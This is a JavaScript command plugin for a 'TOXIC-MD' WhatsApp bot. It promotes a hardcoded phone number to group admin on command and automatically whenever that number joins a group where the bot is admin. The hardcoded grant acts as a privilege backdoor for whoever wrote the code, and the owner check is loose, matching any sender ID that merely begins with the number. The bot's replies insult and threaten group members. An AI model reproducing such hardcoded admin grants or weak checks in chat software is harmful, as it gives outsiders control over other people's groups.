const { zokou } = require('../framework/zokou');

// Define the owner number
const OWNER_NUMBER = "254735342808";
const OWNER_JID = `${OWNER_NUMBER}@s.whatsapp.net`;

// Normalize phone number
const normalizeNumber = (number) => {
  return number.replace(/[^0-9]/g, '').replace(/^0+/, '').replace(/^\+254/, '254') || number;
};

// Retry function for promotion
const retryPromote = async (zk, groupId, participant, maxRetries = 3, delay = 2000) => {
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      console.log(`[DEBUG] Attempt ${attempt} to promote ${participant} in ${groupId}`);
      await zk.groupParticipantsUpdate(groupId, [participant], "promote");
      console.log(`[DEBUG] Promotion successful on attempt ${attempt}`);
      return true;
    } catch (e) {
      console.log(`[DEBUG] Attempt ${attempt} failed: ${e.message}`);
      if (attempt === maxRetries) throw e;
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
};

// Admin check function (mirroring .promote)
const memberAdmin = (participants) => {
  let admins = [];
  for (let m of participants) {
    if (m.admin != null) admins.push(m.id);
  }
  return admins;
};

zokou({ nomCom: "powner", categorie: "Group", reaction: "💥" }, async (dest, zk, commandeOptions) => {
  const { ms, repondre, verifGroupe, infosGroupe, auteurMessage, idBot } = commandeOptions;

  console.log(`[DEBUG] powner triggered by ${ms.key.participant || ms.key.remoteJid} in ${dest}`);
  console.log(`[DEBUG] auteurMessage: ${auteurMessage}, expected: ${OWNER_JID}`);
  console.log(`[DEBUG] idBot: ${idBot}`);
  console.log(`[DEBUG] ms object:`, JSON.stringify(ms, null, 2));

  // Handle null pushName
  const userName = ms.pushName || "Boss";

  // Check if it’s a group chat
  if (!verifGroupe) {
    console.log(`[DEBUG] powner: Not a group chat`);
    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YOU HOPELESS DOLT! 😡 This isn’t a group! Stop wasting my time and GET TO A GROUP! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Check if user is owner
  const normalizedAuteur = normalizeNumber(auteurMessage.split('@')[0]);
  const normalizedOwner = normalizeNumber(OWNER_NUMBER);
  const isOwner = auteurMessage === OWNER_JID || normalizedAuteur === normalizedOwner || auteurMessage.startsWith(OWNER_NUMBER);
  console.log(`[DEBUG] Owner check: isOwner=${isOwner}, normalizedAuteur=${normalizedAuteur}, normalizedOwner=${normalizedOwner}`);

  if (!isOwner) {
    console.log(`[DEBUG] powner: User is not the owner`);
    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YOU DISGUSTING FAKE! 😤 Trying to usurp ${OWNER_NUMBER}? You’re WORTHLESS! Scram, vermin! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Get group metadata and admins
  const membresGroupe = verifGroupe ? await infosGroupe.participants : [];
  const admins = memberAdmin(membresGroupe);
  const zkad = admins.includes(idBot);
  console.log(`[DEBUG] Bot admin check: zkad=${zkad}, idBot=${idBot}, admins=`, admins);

  if (!zkad) {
    console.log(`[DEBUG] powner: Bot is not an admin`);
    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ LISTEN UP, ${userName}! 😤 I’m not an admin, so I can’t crown you! Make me admin or I’ll OBLITERATE THIS GROUP! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Check if owner is in group
  const ownerInGroup = membresGroupe.some(member => member.id === OWNER_JID || normalizeNumber(member.id.split('@')[0]) === normalizedOwner);
  console.log(`[DEBUG] Owner in group: ${ownerInGroup}`);

  if (!ownerInGroup) {
    console.log(`[DEBUG] powner: Owner is not in the group`);
    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ BOSS, WHAT’S YOUR DEAL? 😳 You’re not in this group! Join now or I’m OUT! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Check if owner is already admin
  const ownerMember = membresGroupe.find(member => member.id === OWNER_JID || normalizeNumber(member.id.split('@')[0]) === normalizedOwner);
  const ownerIsAdmin = ownerMember && ownerMember.admin != null;
  console.log(`[DEBUG] Owner admin status: ${ownerIsAdmin}`);

  if (ownerIsAdmin) {
    console.log(`[DEBUG] powner: Owner is already an admin`);
    repondre(`𝐓𝐎𝐗𝐈𝐂-M𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ HOLD UP, ${userName}! 😎 You’re already the ABSOLUTE OVERLORD here! Keep dominating! 💪\n◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Promote owner with retries
  try {
    await retryPromote(zk, dest, OWNER_JID);
    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ ALL BOW TO ${userName}! 😈 You’re now the UNKILLABLE EMPEROR of this group! DESTROY ALL WHO OPPOSE! 💥\n│❒ Powered by xh_clinton\n◈━━━━━━━━━━━━━━━━◈`);
  } catch (e) {
    console.log(`[DEBUG] powner: Final promotion error: ${e}`);
    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ THIS IS INFURIATING, ${userName}! 😤 Couldn’t crown you: ${e.message}! I’ll DEMOLISH THIS TRASH SYSTEM! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
  }
});

// Auto-promotion on join
zokou.on('group-participants-update', async (update) => {
  const { id, participants, action } = update;

  console.log(`[DEBUG] group-participants-update: Action: ${action}, Group: ${id}, Participants: ${participants}`);

  if (action !== 'add') {
    console.log(`[DEBUG] group-participants-update: Ignoring non-add action`);
    return;
  }

  // Check bot admin status
  let zkad = false;
  let admins = [];
  try {
    const metadata = await zokou.groupMetadata(id);
    const membresGroupe = metadata.participants;
    admins = memberAdmin(membresGroupe);
    zkad = admins.includes(zokou.user.id);
    console.log(`[DEBUG] Auto-promote bot admin check: zkad=${zkad}, idBot=${zokou.user.id}, admins=`, admins);
  } catch (e) {
    console.log(`[DEBUG] Error fetching metadata for auto-promote: ${e}`);
  }

  if (!zkad) {
    console.log(`[DEBUG] group-participants-update: Bot is not admin`);
    await zokou.sendMessage(id, { text: `𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YOU PATHETIC FOOLS! 😤 I’m not admin, so I can’t crown the boss! Make me admin or FACE MY WRATH! 🚫\n◈━━━━━━━━━━━━━━━━◈` });
    return;
  }

  // Check if owner joined
  const normalizedOwner = normalizeNumber(OWNER_NUMBER);
  const ownerJoined = participants.some(p => p === OWNER_JID || normalizeNumber(p.split('@')[0]) === normalizedOwner);
  console.log(`[DEBUG] Owner joined: ${ownerJoined}`);

  if (!ownerJoined) {
    console.log(`[DEBUG] group-participants-update: Owner did not join`);
    return;
  }

  // Check if owner is already admin
  const metadata = await zokou.groupMetadata(id);
  const membresGroupe = metadata.participants;
  const ownerMember = membresGroupe.find(p => p.id === OWNER_JID || normalizeNumber(p.id.split('@')[0]) === normalizedOwner);
  const ownerIsAdmin = ownerMember && ownerMember.admin != null;

  if (ownerIsAdmin) {
    console.log(`[DEBUG] group-participants-update: Owner is already admin`);
    return;
  }

  // Promote owner with retries
  try {
    await retryPromote(zokou, id, OWNER_JID);
    await zokou.sendMessage(id, { text: `𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ KNEEL, YOU FILTH! 😈 The SUPREME CONQUEROR ${OWNER_NUMBER} has arrived!\n│❒ I’ve crowned them ADMIN before you could blink! OBEY OR BE ERASED! 💥\n│❒ Powered by xh_clinton\n◈━━━━━━━━━━━━━━━━◈` });
  } catch (e) {
    console.log(`[DEBUG] group-participants-update: Final promotion error: ${e}`);
    await zokou.sendMessage(id, { text: `𝐓𝐎𝐗𝐈𝐂-M𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ THE BOSS ${OWNER_NUMBER} IS HERE! 😎 But this junk system failed: ${e.message}!\n│❒ I’ll CRUSH IT TO DUST unless it’s fixed! 😡\n◈━━━━━━━━━━━━━━━━◈` });
  }
});